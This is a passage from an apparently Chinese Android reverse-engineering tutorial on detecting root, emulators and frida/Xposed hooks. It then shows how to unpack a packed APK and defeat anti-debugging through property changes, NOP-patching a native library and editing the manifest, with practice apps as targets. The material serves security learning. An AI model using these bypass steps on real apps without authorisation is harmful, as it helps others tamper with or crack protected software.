class=\"string\">&quot;/system/xbin/which&quot;</span>,<span class=\"string\">&quot;su&quot;</span>&#125;;</span><br><span class=\"line\">           process = Runtime.getRuntime().exec(stringArray1);</span><br><span class=\"line\"><span class=\"comment\">//遍历到说明含root，遍历不到说明为含root</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）检测系统是否为测试版\"><a href=\"#（2）检测系统是否为测试版\" class=\"headerlink\" title=\"（2）检测系统是否为测试版\"></a>（2）检测系统是否为测试版</h4><p>编译Android源码系统时，如果我们编译生成的是测试版，是自动拥有root权限的，这时我们将su修改名字就可以绕过root检测了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /system/build.prop | grep ro.build.tags</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/8.png\" alt=\"image-20220424140832763\"></p>\n<p>这返回结果“test-keys”，代表此系统是测试版</p>\n<p>返回结果“release-keys”，代表此系统是正式版</p>\n<h4 id=\"（3）使用which命令查看是否有su\"><a href=\"#（3）使用which命令查看是否有su\" class=\"headerlink\" title=\"（3）使用which命令查看是否有su\"></a>（3）使用which命令查看是否有su</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">which su</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/9.png\" alt=\"image-20220424141214287\"></p>\n<h4 id=\"（4）检测Magisk或Superuser-apk\"><a href=\"#（4）检测Magisk或Superuser-apk\" class=\"headerlink\" title=\"（4）检测Magisk或Superuser.apk\"></a>（4）检测Magisk或Superuser.apk</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">File</span> <span class=\"variable\">file</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;/system/app/Superuser.apk&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file.exists()) </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Log.i(LOG_TAG, <span class=\"string\">&quot;/system/app/Superuser.apk exist&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//检测Magisk 是否安装包名为 com.topjohnwu.magisk</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（5）执行Busybox\"><a href=\"#（5）执行Busybox\" class=\"headerlink\" title=\"（5）执行Busybox\"></a>（5）执行Busybox</h4><p>设备被root，很有可能被安装busybox</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">which busybox</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/10.png\" alt=\"image-20220424142340018\"></p>\n<p>执行busybox:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">String[] strCmd = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[] &#123;<span class=\"string\">&quot;busybox&quot;</span>,<span class=\"string\">&quot;df&quot;</span>&#125;;</span><br><span class=\"line\">    ArrayList&lt;String&gt; execResult = executeCommand(strCmd);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (execResult != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        Log.i(LOG_TAG,<span class=\"string\">&quot;成功&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        Log.i(LOG_TAG,<span class=\"string\">&quot;失败&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（6）访问私有目录\"><a href=\"#（6）访问私有目录\" class=\"headerlink\" title=\"（6）访问私有目录\"></a>（6）访问私有目录</h4><p>Android系统中私有目录必须要获取root权限才能进行访问，例如 &#x2F;data、&#x2F;system、&#x2F;etc 等，可以通过读写测试来判断：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Boolean</span> <span class=\"variable\">writeFlag</span> <span class=\"operator\">=</span> writeFile(<span class=\"string\">&quot;/data/su_test&quot;</span>, fileContent);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (writeFlag) &#123;</span><br><span class=\"line\">                Log.i(LOG_TAG, <span class=\"string\">&quot;write ok&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                Log.i(LOG_TAG, <span class=\"string\">&quot;write failed&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">strRead</span> <span class=\"operator\">=</span> readFile(<span class=\"string\">&quot;/data/su_test&quot;</span>);</span><br><span class=\"line\">            Log.i(LOG_TAG, <span class=\"string\">&quot;strRead=&quot;</span> + strRead);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fileContent.equals(strRead)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（7）读取build-prop中的关键属性\"><a href=\"#（7）读取build-prop中的关键属性\" class=\"headerlink\" title=\"（7）读取build.prop中的关键属性\"></a>（7）读取build.prop中的关键属性</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">getprop ro.build.type</span><br><span class=\"line\">getprop ro.build.tags</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/11.png\" alt=\"image-20220424143048945\"></p>\n<p>我们可以看出这是测试版，就具有root权限</p>\n<h4 id=\"（8）检测市面上主流的模拟器\"><a href=\"#（8）检测市面上主流的模拟器\" class=\"headerlink\" title=\"（8）检测市面上主流的模拟器\"></a>（8）检测市面上主流的模拟器</h4><p>一般市面上的模拟器都带有root权限，比如我们可以使用上文的模拟器检测来进一步检测root，比如夜神模拟器<code>nox</code>等</p>\n<h4 id=\"（9）检测hook框架特征\"><a href=\"#（9）检测hook框架特征\" class=\"headerlink\" title=\"（9）检测hook框架特征\"></a>（9）检测hook框架特征</h4><p>无论Xposed还是frida都需要root，我们也可以通过检测hook框架来判断是否进行root</p>\n<h3 id=\"4-hook检测\"><a href=\"#4-hook检测\" class=\"headerlink\" title=\"4.hook检测\"></a>4.hook检测</h3><h4 id=\"（1）Xposed检测\"><a href=\"#（1）Xposed检测\" class=\"headerlink\" title=\"（1）Xposed检测\"></a>（1）Xposed检测</h4><p>Xposed是一个动态插桩的hook框架，通过替换app_process原始进程，将java函数注册为native函数，从而获得更早的运行时机，Xposed检测详细可以参考我之前的文章<a href=\"https://bbs.pediy.com/thread-269627.htm\">Xposed定制</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/12.png\" alt=\"image-20220424143048945\"></p>\n<p>图中的特征修改点就是我们可以进行检测的地方</p>\n<h4 id=\"（2）frida检测\"><a href=\"#（2）frida检测\" class=\"headerlink\" title=\"（2）frida检测\"></a>（2）frida检测</h4><p>frida和Xposed原理差不多，同样是一个动态插桩工具，详细的源码分析可以参考文章：<a href=\"https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/\">frida源码分析</a></p>\n<p>frida检测的途径很多，这里只简单介绍一些</p>\n<p><strong>端口和frida_server检测：</strong></p>\n<p>最简单的一种检测方式，厂商通过检测端口是否为固定的27047，还可以检测运行的frida_server名称</p>\n<p><strong>so层系统API检测：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">遍历连接手机所有端口发送D-bus消息，如果返回&quot;REJECT&quot;这个特征则认为存在frida-server</span><br><span class=\"line\">直接调用openat的syscall的检测在text节表中搜索frida-gadget*.so / frida-agent*.so字符串，避免了hook libc来anti-anti的方法</span><br><span class=\"line\">内存中存在frida rpc字符串，认为有frida-server</span><br></pre></td></tr></table></figure>\n\n<p><strong>so层非系统API检测：</strong></p>\n<p>遍历连接手机所有端口发送D-bus消息，如果返回”REJECT”这个特征则认为存在frida-server</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Mini-portscan to detect frida-server on any local port.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span> ; i &lt;= <span class=\"number\">65535</span> ; i++) &#123;</span><br><span class=\"line\">    sock = socket(AF_INET , SOCK_STREAM , <span class=\"number\">0</span>);</span><br><span class=\"line\">    sa.sin_port = htons(i);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        __android_log_print(ANDROID_LOG_VERBOSE, APPNAME,  <span class=\"string\">&quot;FRIDA DETECTION [1]: Open Port: %d&quot;</span>, i);</span><br><span class=\"line\">        memset(res, <span class=\"number\">0</span> , <span class=\"number\">7</span>);</span><br><span class=\"line\">        <span class=\"comment\">// send a D-Bus AUTH message. Expected answer is “REJECT&quot;</span></span><br><span class=\"line\">        send(sock, <span class=\"string\">&quot;\\x00&quot;</span>, <span class=\"number\">1</span>, NULL);</span><br><span class=\"line\">        send(sock, <span class=\"string\">&quot;AUTH\\r\\n&quot;</span>, <span class=\"number\">6</span>, NULL);</span><br><span class=\"line\">        usleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret = recv(sock, res, <span class=\"number\">6</span>, MSG_DONTWAIT) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (strcmp(res, <span class=\"string\">&quot;REJECT&quot;</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               <span class=\"comment\">/* Frida server detected. Do something… */</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    close(sock);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>检测内存库来检测：</strong></p>\n<p>Frida 的各个模式都是用来注入的，我们可以利用的点就是 frida 运行时映射到内存的库。最直接的是挨个检查加载的库</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> line[<span class=\"number\">512</span>];</span><br><span class=\"line\">FILE* fp;</span><br><span class=\"line\">fp = fopen(<span class=\"string\">&quot;/proc/self/maps&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (fp) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (fgets(line, <span class=\"number\">512</span>, fp)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strstr(line, <span class=\"string\">&quot;frida&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* Evil library is loaded. Do something… */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">       <span class=\"comment\">/* Error opening /proc/self/maps. If this happens, something is off. */</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>inlinehook检测frida：</strong></p>\n<p>frida实现hook一定实现了inlinehook技术，所以我们还可以通过inlinehook库来检测</p>\n<p>参考文章:<a href=\"https://bbs.pediy.com/thread-269862.htm\">从inlinehook角度检测frida</a></p>\n<h2 id=\"三、动静态分析实例分析\"><a href=\"#三、动静态分析实例分析\" class=\"headerlink\" title=\"三、动静态分析实例分析\"></a>三、动静态分析实例分析</h2><h3 id=\"1-静态分析与脱壳\"><a href=\"#1-静态分析与脱壳\" class=\"headerlink\" title=\"1.静态分析与脱壳\"></a>1.静态分析与脱壳</h3><p>实验案例：client.apk，漏洞银行.apk</p>\n<h4 id=\"（1）脱壳\"><a href=\"#（1）脱壳\" class=\"headerlink\" title=\"（1）脱壳\"></a>（1）脱壳</h4><p>我们打开client.apk，发现使用360加壳</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/13.png\" alt=\"image-20220424150652346\"></p>\n<p>然后我们使用葫芦娃大佬Frida_Dexdump脱壳工具进行脱壳，项目代码：<a href=\"https://github.com/hluwa/frida-dexdump\">https://github.com/hluwa/frida-dexdump</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)启动frida_server</span><br><span class=\"line\">(2)直接frida-dexdump -U -d -f 包名 -o 路径名</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/14.png\" alt=\"image-20220424150652346\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/15.png\" alt=\"image-20220424150652346\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/16.png\" alt=\"image-20220424151332577\"></p>\n<h4 id=\"（2）静态分析\"><a href=\"#（2）静态分析\" class=\"headerlink\" title=\"（2）静态分析\"></a>（2）静态分析</h4><p>我们脱壳完成后就进入正常的静态分析流程</p>\n<p>首先，从入口点出发：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/17.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/18.png\" alt=\"image-20220424151332577\"></p>\n<p>我们可以看见入口类最后一个函数是启动一个延时器，3秒后延时实例化<code>SplachScreen$a()</code>类，然后我们进入此类</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/19.png\" alt=\"image-20220424151332577\"></p>\n<p>我们可以发现该类实现Runnable接口，启动一个线程，然后里面完成从当前的Activity跳转到<code>MainActivity</code>类</p>\n<p>进入<code>MainAcitivity</code>类：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/20.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/21.png\" alt=\"image-20220424151332577\"></p>\n<p>我们简单分析一下代码逻辑，可以发现该APP实现了一些常见的反调试手段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）模拟器检测</span><br><span class=\"line\">（2）动态调试检测</span><br><span class=\"line\">（3）Root检测</span><br><span class=\"line\">（4）Frida检测</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-动态调试过反调试\"><a href=\"#2-动态调试过反调试\" class=\"headerlink\" title=\"2.动态调试过反调试\"></a>2.动态调试过反调试</h3><h4 id=\"（1）java层\"><a href=\"#（1）java层\" class=\"headerlink\" title=\"（1）java层\"></a>（1）java层</h4><p>案例：wifiKiller.apk</p>\n<p>这里我们使用AndroidStudio进行动态调试，发现没有debuggable的值，就默认ro.debuggable &#x3D; false防止反调：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/34.png\" alt=\"image-20220424151332577\"></p>\n<p>Android studio在动态调试的时候出现错误:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/35.png\" alt=\"image-20220424151332577\"></p>\n<h4 id=\"（2）java层过反调\"><a href=\"#（2）java层过反调\" class=\"headerlink\" title=\"（2）java层过反调\"></a>（2）java层过反调</h4><p>java层过反调方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mprop模块</span><br><span class=\"line\">xposed模块</span><br><span class=\"line\">定制Room</span><br></pre></td></tr></table></figure>\n\n<p>这里我们使用第一种方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./mprop ro.debuggable 1</span><br><span class=\"line\">getprop ro.debuggable</span><br><span class=\"line\">start;stop</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/36.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/37.png\" alt=\"image-20220424151332577\"></p>\n<p>我们发现ddms可以查看进程说明已经过java层反调试了</p>\n<h4 id=\"（3）so层\"><a href=\"#（3）so层\" class=\"headerlink\" title=\"（3）so层\"></a>（3）so层</h4><h5 id=\"lt-1-gt-IDA普通调试\"><a href=\"#lt-1-gt-IDA普通调试\" class=\"headerlink\" title=\"&lt;1&gt;IDA普通调试\"></a>&lt;1&gt;IDA普通调试</h5><p>样例：AliCrakme.apk</p>\n<p>我们进行静态分析，分析到了native函数，就需要对so层进行分析了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/38.png\" alt=\"image-20220424151332577\"></p>\n<p>我们继续上面的案例，首先运行android_server (这里这样是防止android_server反调试)</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/39.png\" alt=\"image-20220424151332577\"></p>\n<p>然后进行端口转发 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb forward tcp:39026 tcp:39026</span><br></pre></td></tr></table></figure>\n\n<p>然后附加程序</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/40.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/41.png\" alt=\"image-20220424151332577\"></p>\n<p>在module中查找对应的so文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/42.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/43.png\" alt=\"image-20220424151332577\"></p>\n<p>直接进入securityCheck函数</p>\n<p>我们在函数头f2下一断点，开始动态调试</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/44.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/45.png\" alt=\"image-20220424151332577\"></p>\n<p>以上是可以直接将so文件，附加进来，但是有时IDA版本或者手机系统版本原因，我们不能在moudle模块中找到</p>\n<p>解决办法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">绝对地址 = 相对地址（native函数）+ 基地址（so文件）</span><br></pre></td></tr></table></figure>\n\n<p>首先，我们Ctrl+s找到so文件对应的基地址</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/46.png\" alt=\"image-20220424151332577\"></p>\n<p>其次我们相对地址就是我们静态调试时的函数地址</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/47.png\" alt=\"image-20220424151332577\"></p>\n<p>相对地址&#x3D;11AB+B3AFA000&#x3D;B3AF A1AB 我们可以发现这和我们附加进来的地址一致</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/48.png\" alt=\"image-20220424151332577\"></p>\n<p>这说明程序一定含有反调试的策略，我们接下来应该解决程序的反调试策略</p>\n<h4 id=\"（4）so层过反调\"><a href=\"#（4）so层过反调\" class=\"headerlink\" title=\"（4）so层过反调\"></a>（4）so层过反调</h4><p>我们可以查看TrancePId值来验证(我们需要重新执行以上步骤动态调试，不过不运行)</p>\n<p>首先，我们查看程序进程状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps |grep tong</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/49.png\" alt=\"image-20220424151332577\"></p>\n<p>其次我们，根据找到的PID号，查看对应状态：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /proc/25196/status </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/50.png\" alt=\"image-20220424151332577\"></p>\n<p>你发现这里的值不为0，你可以验证没有进行IDA调试时候的值，经过以上分析我们可以确定该APK采用了反调试策略</p>\n<h5 id=\"lt-1-gt-IDA挂起动态调试\"><a href=\"#lt-1-gt-IDA挂起动态调试\" class=\"headerlink\" title=\"&lt;1&gt;IDA挂起动态调试\"></a>&lt;1&gt;IDA挂起动态调试</h5><p>首先完成基础配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a.运行android_server</span><br><span class=\"line\">b.转发端口</span><br><span class=\"line\">c.打开ddms,查看进程状态</span><br><span class=\"line\">d.挂起程序 adb shell am start -D -n 包名/.MainActivity</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/51.png\" alt=\"image-20220424151332577\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/52.png\" alt=\"image-20220424151332577\"></p>\n<p>你要获得后面的程序，可以打开程序后，输入adb shell dumpsys activity top 则可以查看</p>\n<p>我们发现ddms上的进程前面出现红色小虫子，说明程序被挂起，而手机端也会显示挂起的界面</p>\n<p>然后进行附加进程，挂载三项</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/53.png\" alt=\"image-20220424151332577\"></p>\n<p>然后按F9运行，我们发现此时程序退出，这是因为我们此时是挂起调试，程序还没有初始化</p>\n<p>我们运行:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8609</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/54.png\" alt=\"image-20220424151332577\"></p>\n<p>IDA附加so文件，我们点击取消就可以加载进来（要是没显示就按照上文地址的计算方法）</p>\n<p>我们此时进入libCramke.so文件，并进入JNI_OnLoad方法（我们进入这里主要是为了解决反调试）</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/55.png\" alt=\"image-20220424151332577\"></p>\n<p>我们按F9运行，并按F8进行单步步入</p>\n<p>下面使用F8开始单步调试了，发现每次到达BLX R7这条指令执行完之后，JNI_OnLoad函数就退出了，这个地方存在问题，可能就是反调试的地方了。我们再次进入调试，看见BLX跳转的地方R7寄存器中是 pthread_create 函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/56.png\" alt=\"image-20220424151332577\"></p>\n<p>到了这里我们就找到了出问题的地方，接下来我们只需要修改对应的位置就可以了。</p>\n<p>可以把 BLX R7 这条指令给nop掉，也就是把这条指令变成空指令（相当于删除这条指令）这样apk就不会新建线程去执行检测代码了。</p>\n<p>我们在直接静态分析so的IDA中找到 BLX R7的位置</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/57.png\" alt=\"image-20220424151332577\"></p>\n<p>我们把这条指令给nop掉，我们打开其对应16进制的窗口，并把值改为0</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/58.png\" alt=\"image-20220424151332577\"></p>\n<p>我们保存修改后的so文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/59.png\" alt=\"image-20220424151332577\"></p>\n<p>我们保存，再AndroidKiller里面进行回编译，则得到绕过反调试的apk</p>\n<h2 id=\"四、其他防护过反调试\"><a href=\"#四、其他防护过反调试\" class=\"headerlink\" title=\"四、其他防护过反调试\"></a>四、其他防护过反调试</h2><p>我们上面静态分析了漏洞银行的案例，我们发现其采用了模拟器检测、root检测、frida检测，下面我们依次进行反调试绕过</p>\n<h3 id=\"1-过模拟器检测\"><a href=\"#1-过模拟器检测\" class=\"headerlink\" title=\"1.过模拟器检测\"></a>1.过模拟器检测</h3><p>首先我们定位到该处的代码段</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/60.png\" alt=\"image-20220418112117049\"></p>\n<p>经过分析我们可以分析关键变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">str2-----&gt;d.a-----&gt;i3</span><br></pre></td></tr></table></figure>\n\n<p>即决定模拟器检测的变量是<code>i3</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/61.png\" alt=\"image-20220418112558229\"></p>\n<p>我们从下至上逐一分析代码逻辑：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/62.png\" alt=\"image-20220418112917345\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里检测windows下bluestacks模拟器的文件夹是否存在，存在i3值即增加</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/63.png\" alt=\"image-20220418113041416\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里使用GLES20着色器来检测Bluestacks模拟器和Translator模拟器</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/64.png\" alt=\"image-20220418124110887\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">上面部分代码就是从sdk等方面检测各个模拟器，我们可以看见我们这里的夜神模拟器nox</span><br></pre></td></tr></table></figure>\n\n<p>我们分析了模拟器检测的代码，但是这里我们发现这部分代码并没有直接导致程序崩溃的代码段</p>\n<p>我们继续分析，发现</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/65.png\" alt=\"image-20220418124626125\"></p>\n<p>只有当我们进行root、frida等情况，才会将APP关闭，而此时我们还没有使用frida，这就是模拟器root的原因导致的</p>\n<p>这里首先我们关闭模拟器的root设置，进行重启，按照判断，应该是可以正常安装</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/66.png\" alt=\"image-20220418125212962\"></p>\n<p>再次安装，发现奇怪还是一样安装失败</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/67.png\" alt=\"image-20220418103815525\"></p>\n<p>此时我们进一步分析，按理说就算检测到模拟器，检测root也应该是可以安装成功，只是打开时候结束，这里说明还有其他地方有防护</p>\n<p>经过分析，我们在<code>AndroidManifest.xml</code>中找到一个关键属性<code>hardwareAccelerated</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/68.png\" alt=\"image-20220418125732581\"></p>\n<p><code>hardwareAccelerated=ture</code>意味着APP计划利用移动设备中GPU资源来使其运行，但是很显然我们的模拟器是没有GPU的，所以就会导致直接崩溃，安装不上去</p>\n<p>这里我们简单将<code>hardwareAccelerated</code>值改为false，然后重编译</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/69.png\" alt=\"image-20220418125954986\"></p>\n<p>然后我们再次安装</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/70.png\" alt=\"image-20220418130031095\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/71.png\" alt=\"image-20220418130047867\"></p>\n<p>程序成功安装，并可以打开，这里我们启动root可以进一步验证一下刚才的分析：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/72.png\" alt=\"image-20220418130214218\"></p>\n<p>果然程序就打开后，直接闪退，并报错检测到root，这和我们上面的分析一致，也证明这里我们解决了模拟器检测绕过</p>\n<h3 id=\"2过root检测\"><a href=\"#2过root检测\" class=\"headerlink\" title=\"2过root检测\"></a>2过root检测</h3><p>上面虽然我们关闭root可以解决模拟器检测绕过问题，但是很多时候没有root，我们就很受限了，这里我们尝试进一步绕过root检测</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/73.png\" alt=\"image-20220418130605478\"></p>\n<p>这里我们可以发现只需要将<code>a.R()</code>的返回值修改就可以了，我们可以采用hook手段，如Xposed或frida</p>\n<p>我们进一步分析，root检测实现：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/74.png\" alt=\"image-20220418131313998\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们可以发现检测root的原理很简单：</span><br><span class=\"line\">（1）列举所有su存在的集合</span><br><span class=\"line\">（2）遍历集合，执行su，看是否成功</span><br><span 